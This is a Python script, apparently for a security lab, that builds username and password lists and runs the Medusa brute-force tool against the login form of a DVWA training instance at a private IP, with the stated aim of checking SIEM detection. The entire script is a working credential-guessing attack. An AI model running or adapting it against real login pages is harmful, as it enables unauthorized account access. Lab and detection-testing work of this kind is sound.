import os
import sys
import subprocess

# --- Configurações ---
USERS_FILE = "users_dvwa.txt"
PASS_FILE = "pass_dvwa.txt"
DEFAULT_USERS = ["admin", "guest", "user", "root", "tester"]
DEFAULT_PASSWORDS = ["password", "123456", "admin123", "toor", "test"]
TARGET_IP = "192.168.15.36" # IP do seu DVWA - AJUSTE CONFORME NECESSÁRIO!

def get_custom_list(list_name, default_list):
    """Permite ao usuário adicionar itens personalizados à lista padrão."""
    custom_list = list(default_list)
    
    resposta = input(f"Deseja adicionar um {list_name} personalizado? (s/n): ").lower()
    if resposta in ['s', 'sim']:
        print(f"\nDigite os {list_name}s que deseja adicionar (um por linha). Digite 'fim' para terminar.")
        while True:
            item = input(f"Adicionar {list_name} (ou 'fim'): ").strip()
            if item.lower() == 'fim':
                break
            if item and item not in custom_list:
                custom_list.append(item)
    return custom_list

def save_list_to_file(file_name, data_list):
    """Salva a lista final em um arquivo de texto."""
    try:
        with open(file_name, 'w') as f:
            f.write('\n'.join(data_list) + '\n')
        print(f"[SUCESSO] Lista de {file_name} criada com {len(data_list)} itens.")
    except Exception as e:
        print(f"[ERRO] Falha ao salvar o arquivo {file_name}: {e}")
        sys.exit(1)

def executar_medusa():
    """Executa o comando Medusa para o ataque ao formulário HTTP do DVWA."""
    print("\n==================================================================")
    print("📢 ETAPA DE EXECUÇÃO DO MEDUSA (DVWA HTTP FORM) INICIADA 📢")
    print(f"🚀 Executando Força Bruta contra {TARGET_IP} (Investigação SIEM)...")
    print("==================================================================")

    # Comando Medusa que será executado
    medusa_command = [
        "medusa", 
        "-h", TARGET_IP, 
        "-U", USERS_FILE, 
        "-P", PASS_FILE, 
        "-M", "http", 
        "-m", "PAGE:/dvwa/login.php", 
        "-m", "FORM:username=^USER^&password=^PASS^&Login=Login", 
        "-m", "FAIL=Login failed", 
        "-t", "6"
    ]
    
    print(f"Comando: {' '.join(medusa_command)}")
    
    try:
        # Executa o comando e exibe a saída em tempo real
        subprocess.run(medusa_command, check=True)
        print("\n✅ FIM da execução do Medusa. Verifique os logs e o SIEM para detecção.")
    except FileNotFoundError:
        print("\n[ERRO] A ferramenta 'medusa' não foi encontrada.")
    except subprocess.CalledProcessError as e:
        print(f"\n[INFO] Medusa concluído. Verifique o resultado acima.")

def main():
    print("--- 💻 DevSecOps Lab: Força Bruta DVWA (Python) ---")
    
    # 1. Criação de Listas
    user_list = get_custom_list("usuário", DEFAULT_USERS)
    save_list_to_file(USERS_FILE, user_list)
    pass_list = get_custom_list("senha", DEFAULT_PASSWORDS)
    save_list_to_file(PASS_FILE, pass_list)
    
    # 2. Execução
    executar_medusa()
    
    # 3. Limpeza
    os.remove(USERS_FILE)
    os.remove(PASS_FILE)
    print(f"\n--- Limpeza de Arquivos ---\nArquivos {USERS_FILE} e {PASS_FILE} removidos.")

if __name__ == "__main__":
    main()